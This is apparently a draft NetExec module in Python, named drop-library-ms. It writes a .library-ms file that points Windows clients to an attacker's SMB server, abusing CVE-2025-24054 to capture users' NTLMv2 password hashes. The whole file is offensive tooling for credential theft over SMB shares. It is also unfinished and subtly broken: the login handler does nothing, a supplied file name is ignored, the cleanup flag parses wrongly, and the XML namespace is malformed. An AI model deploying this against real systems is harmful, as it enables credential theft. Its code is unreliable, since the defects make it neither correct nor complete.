import random
import string
import ntpath

from nxc.paths import TMP_PATH

class NXCModule:
    """
    Requested by the issue #512, heavily inspired by drop-sc, scuffy and slinky modules
    https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/
    Module by: @XedSama
    """
    name = "drop-library-ms"
    description = "Create and upload an arbitrary .library-ms, leveraging CVE-2025-24054 for dumping NTLMv2 hash" #TODO
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.ignore_shares = ["C$", "ADMIN$", "NETLOGON", "SYSVOL"]

        self.cleanup = None
        self.server = None

        self.lms_name = None

        self.local_path = None
        self.remote_path = None
        
    def options(self, context, module_options):
        """
        SERVER      Attacker machine
        NAME        File name
        CLEANUP     Cleaning option (True or False)
        """
        self.cleanup = False

        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])
            context.log.debug(f"CLEANUP is set to {self.cleanup}")

        if "NAME" not in module_options:
            self.lms_name = "".join(random.choices(string.ascii_letters, k=8))
            context.log.debug(f"NAME is randomly defined : {self.lms_name}")

        if "NAME" not in module_options and self.cleanup:
            context.log.fail("NAME option is required when CLEANUP option is set to True")
            exit(1)

        if "SERVER" not in module_options and not self.cleanup:
            context.log.fail("SERVER option is required")
            exit(1)

        self.local_path = f"{TMP_PATH}/{self.lms_name}.library-ms"
        self.remote_path = ntpath.join("\\", f"{self.lms_name}.library-ms")

        if not self.cleanup:
            self.server = module_options["SERVER"]
            with open(self.local_path, "w") as libms:
                libms.write('<?xml version="1.0" encoding="UTF-8"?>')
                libms.write('<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">')
                libms.write("<searchConnectorDescriptionList>")
                libms.write("<searchConnectorDescription>")
                libms.write("<simpleLocation>")
                libms.write(f"<url>\\\\{self.server}\\LIBRARY</url>")
                libms.write("</simpleLocation>")
                libms.write("</searchConnectorDescription>")
                libms.write("</searchConnectorDescriptionList>")
                libms.write("</libraryDescription>")

    def on_login(self, context, connection):
        pass